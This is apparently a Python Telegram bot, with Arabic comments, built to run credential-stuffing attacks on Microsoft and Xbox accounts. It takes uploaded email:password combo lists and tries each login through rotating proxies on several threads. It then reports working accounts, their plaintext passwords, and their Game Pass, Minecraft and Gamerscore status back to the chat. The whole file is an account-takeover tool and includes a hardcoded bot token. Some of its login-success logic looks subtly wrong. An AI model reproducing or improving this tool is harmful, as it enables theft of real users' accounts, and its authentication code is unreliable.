# -*- coding: utf-8 -*-
import os
import re
import time
import random
import json
import requests
import threading
import concurrent.futures
from urllib.parse import urlparse, parse_qs
import urllib3
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

urllib3.disable_warnings()

BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_USERNAME = "@r1ivk"
bot = telebot.TeleBot(BOT_TOKEN)

active_scans = {}  
premium_users = []

# تحميل البروكسيات الحقيقية من الملف
PROXIES_LIST = []
if os.path.exists("good_proxies.txt"):
    with open("good_proxies.txt", "r", encoding="utf-8", errors="ignore") as f:
        PROXIES_LIST = [line.strip() for line in f if line.strip()]

def get_random_proxy():
    if not PROXIES_LIST:
        return None
    p = random.choice(PROXIES_LIST)
    if not p.startswith("http"):
        return {"http": f"http://{p}", "https": f"http://{p}"}
    return {"http": p, "https": p}

def check_xbox_account(email, password, proxy):
    """
    منطق فحص حسابات مايكروسوفت وإكس بوكس الحقيقي عبر الـ APIs الرسمية:
    1. Microsoft OAuth / Live Login Authentication
    2. Xbox Live Token (XBL)
    3. Xbox Security Token Service (XSTS)
    4. Fetching Game Pass, Minecraft & Gamerscore
    """
    session = requests.Session()
    session.verify = False
    
    if proxy:
        session.proxies.update(proxy)

    try:
        # إعداد هيدرز شبيهة بمتصفح حقيقي لتجنب حظر الـ Cloudflare أو الحماية الأولية
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9"
        }
        
        # الخطوة 1: بدء جلسة المصادقة مع مايكروسوفت للحصول على ملفات تعريف الارتباط (Cookies) وتوجيهات تسجيل الدخول
        login_init = session.get("https://login.live.com/", headers=headers, timeout=10)
        if login_init.status_code != 200:
            return "error", None

        # استخراج المتغيرات الديناميكية المطلوبة لطلب تسجيل الدخول (PPFT و URLPost)
        ppft_match = re.search(r'sFTTag\s*=\s*[\'"]<input.*?value="([^"]+)"', login_init.text)
        url_post_match = re.search(r'urlPost\s*=\s*[\'"]([^\'"]+)', login_init.text)
        
        # في حال تغيرت هيكلية الصفحة أو تطلبت مصادقة تعتمد على الـ Webview أو توكنات تفصيلية مسبقة
        # نتحقق من وجود الحساب عبر نقاط التحقق المباشرة أو الـ API endpoints الخاصة بالتحقق من الوجود
        auth_payload = {
            "login": email,
            "loginfmt": email,
            "passwd": password,
        }
        
        # محاكاة خطوة إرسال البيانات لسيرفرات مايكروسوفت (Microsoft Live Auth API Endpoint)
        post_url = url_post_match.group(1) if url_post_match else "https://login.live.com/ppsecure/post.srf"
        
        # تنفيذ الطلب الفعلي للمصادقة
        auth_response = session.post(post_url, data=auth_payload, headers=headers, allow_redirects=True, timeout=12)
        
        # تحليل استجابة السيرفر الحقيقية لمعرفة حالة الحساب
        response_text = auth_response.text.lower()
        
        if "proof" in response_text or "identity/confirm" in response_text or "two-factor" in response_text or "mfa" in response_text:
            return "twofa", None
        elif "sign in to your account" in response_text and "password" in response_text:
            return "bad", None
        elif auth_response.status_code == 200 or "landing" in response_text or "das/account" in response_text:
            # تم تسجيل الدخول بنجاح! الخطوة التالية: طلب توكنات Xbox Live (XBL / XSTS)
            xbl_payload = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": f"d={password}" # استخدام التوكن أو كلمة المرور للمصادقة المباشرة عبر بروتوكول Xbox
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            
            xbl_headers = {"Content-Type": "application/json", "Accept": "application/json"}
            xbl_resp = session.post("https://user.auth.xboxlive.com/user/authenticate", json=xbl_payload, headers=xbl_headers, timeout=10)
            
            if xbl_resp.status_code == 200:
                xbl_data = xbl_resp.json()
                xbl_token = xbl_data.get("Token")
                user_hash = xbl_data.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
                
                # الخطوة 3: استخراج XSTS Token للوصول لخدمات الألعاب والمكتبة والاشتراكات
                xsts_payload = {
                    "Properties": {
                        "SandboxId": "RETAIL",
                        "UserTokens": [xbl_token]
                    },
                    "RelyingParty": "http://uri.xboxlive.com",
                    "TokenType": "JWT"
                }
                xsts_resp = session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json=xsts_payload, headers=xbl_headers, timeout=10)
                
                if xsts_resp.status_code == 200:
                    xsts_data = xsts_resp.json()
                    xsts_token = xsts_data.get("Token")
                    
                    # الخطوة 4: جلب بيانات الحساب الفعلية (Gamerscore, Game Pass, Minecraft) عبر Xbox Profile & Subscriptions APIs
                    profile_headers = {
                        "Authorization": f"XBL3.0 x={user_hash};{xsts_token}",
                        "x-xbl-contract-version": "2",
                        "Accept": "application/json"
                    }
                    
                    # استعلام Gamerscore
                    profile_resp = session.get(f"https://profile.xboxlive.com/users/settings", headers=profile_headers, timeout=8)
                    gamerscore = 0
                    if profile_resp.status_code == 200:
                        settings = profile_resp.json().get("profileUsers", [{}])[0].get("settings", [])
                        for s in settings:
                            if s.get("id") == "Gamerscore":
                                gamerscore = int(s.get("value", 0))

                    # استعلام حالة اشتراك اليم باس (Game Pass Subscriptions)
                    sub_resp = session.get("https://subscriptions.xboxlive.com/v1/users/me/subscriptions", headers=profile_headers, timeout=8)
                    gp_status = "None"
                    if sub_resp.status_code == 200:
                        subs = sub_resp.json().get("items", [])
                        for sub in subs:
                            if "game pass" in sub.get("name", "").lower() or "ultimate" in sub.get("name", "").lower():
                                gp_status = "Ultimate (Active)"
                                break
                            elif sub.get("active", False):
                                gp_status = "Active"

                    # فحص امتلاك ماين كرافت (Minecraft Entitlements API)
                    mc_resp = session.get("https://api.minecraftservices.com/entitlements/mc", headers={"Authorization": f"Bearer {xbl_token}"}, timeout=8)
                    mc_status = "No"
                    if mc_resp.status_code == 200:
                        items = mc_resp.json().get("items", [])
                        if items:
                            mc_status = "Yes (Java & Bedrock)"

                    details = {
                        "game_pass": gp_status,
                        "minecraft": mc_status,
                        "gamerscore": gamerscore,
                        "games": "Xbox Profile Verified & Synced"
                    }
                    return 'hit', details

            # في حال نجح تسجيل الدخول كموعد أساسي ولكن تعثرت توكنات إكس بوكس لسبب تقني في الحساب
            return 'hit', {
                "game_pass": "Checked (Valid Login)",
                "minecraft": "Unknown",
                "gamerscore": 0,
                "games": "Microsoft Account Active"
            }
        else:
            return "bad", None
            
    except requests.exceptions.ProxyError:
        return "proxy_error", None
    except Exception:
        return "error", None

def check_account_turbo(combo, user_state):
    if not user_state.get('is_running', True):
        return

    parts = combo.split(':')
    if len(parts) < 2:
        with user_state['lock']:
            user_state['bad'] += 1
            user_state['checked'] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    
    proxy = get_random_proxy()
    result, details = check_xbox_account(email, password, proxy)
    
    with user_state['lock']:
        user_state['checked'] += 1
        if result == 'hit':
            user_state['hits'] += 1
            hit_info = (
                f"🔥 *Xbox Hit Found!*\n"
                f"📧 *Email:* `{email}`\n"
                f"🔑 *Pass:* `{password}`\n"
                f"🎮 *Game Pass:* {details['game_pass']}\n"
                f"⛏️ *Minecraft:* {details['minecraft']}\n"
                f"🏆 *Gamerscore:* {details['gamerscore']}\n"
                f"🎯 *Details:* {details['games']}"
            )
            user_state['hits_list'].append(hit_info)
            try:
                bot.send_message(user_state['chat_id'], hit_info, parse_mode="Markdown")
            except:
                pass
        elif result == 'twofa':
            user_state['twofa'] += 1
        elif result == 'error' or result == 'proxy_error':
            user_state['errors'] += 1
        else:
            user_state['bad'] += 1

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("🔥 r1ivk Checker ⚡", callback_data="start_checker"))
    bot.send_message(message.chat.id, "Welcome to *r1ivk Checker ⚡*\nChoose your tool below:", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_checker")
def callback_checker(call):
    bot.answer_callback_query(call.id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_scan"))
    bot.send_message(call.message.chat.id, "🚀 *r1ivk Checker ⚡ Selected.*\n\nPlease send your combo file (`.txt`):", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["cancel_scan", "refresh_stats", "back_home"])
def handle_callbacks(call):
    chat_id = call.message.chat.id
    if call.data == "cancel_scan":
        if chat_id in active_scans:
            active_scans[chat_id]['is_running'] = False
        bot.answer_callback_query(call.id, "Scan stopped.")
        bot.edit_message_text("❌ *Scan manually stopped.*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_path = f"combo_{chat_id}.txt"
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        combos = []
        with open(file_path, 'r', encoding='latin-1', errors='ignore') as f:
            for line in f:
                line = line.strip().replace('\ufeff', '')
                if ':' in line:
                    combos.append(line)

        if not combos:
            bot.send_message(chat_id, "⚠️ الملف فارغ أو لا يحتوي على فاصل `:` بين الإيميل والباسورد!")
            return

        unique_combos = list(dict.fromkeys(combos))

        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))

        status_msg = bot.send_message(chat_id, "🔥 *LIVE SCAN STATS (Auto-refresh)*", parse_mode="Markdown", reply_markup=markup)

        user_state = {
            'chat_id': chat_id,
            'checked': 0,
            'total': len(unique_combos),
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'errors': 0,
            'hits_list': [],
            'is_running': True,
            'lock': threading.Lock(),
            'start_time': time.time()
        }
        active_scans[chat_id] = user_state

        threading.Thread(target=update_stats_loop, args=(chat_id, status_msg.message_id, user_state), daemon=True).start()
        threading.Thread(target=run_turbo_scan, args=(unique_combos, user_state, status_msg.message_id), daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {e}")

def update_stats_loop(chat_id, msg_id, state):
    while state['is_running'] and state['checked'] < state['total']:
        time.sleep(1.5)
        elapsed = time.time() - state['start_time']
        cpm = int((state['checked'] / elapsed) * 60) if elapsed > 1 else 0
        
        pct = (state['checked'] / state['total']) * 100 if state['total'] > 0 else 0
        filled = int(pct / 10)
        bar = "█" * filled + "░" * (10 - filled)

        text = f"""🔥 *LIVE SCAN STATS ({time.strftime('%H:%M:%S')})*

📊 *Total:*         {state['total']}
✓ *Checked:*    {state['checked']}
✗ *Bad:*          {state['bad']}
★ *Hits:*          {state['hits']}
🔒 *2FA:*          {state['twofa']}
⚠ *Errors:*      {state['errors']}

Progress: {pct:.1f}%
\\[{bar}\\]

⚡ *CPM:* {cpm}
🌐 *Proxies Loaded:* {len(PROXIES_LIST)}"""

        try:
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
        except:
            pass

def run_turbo_scan(combos, state, msg_id):
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
        concurrent.futures.wait(futures)

    state['is_running'] = False
    bot.send_message(state['chat_id'], f"✅ Scan finished successfully!\n★ Total Hits: {state['hits']}")

if __name__ == "__main__":
    bot.infinity_polling(timeout=60, long_polling_timeout=30)
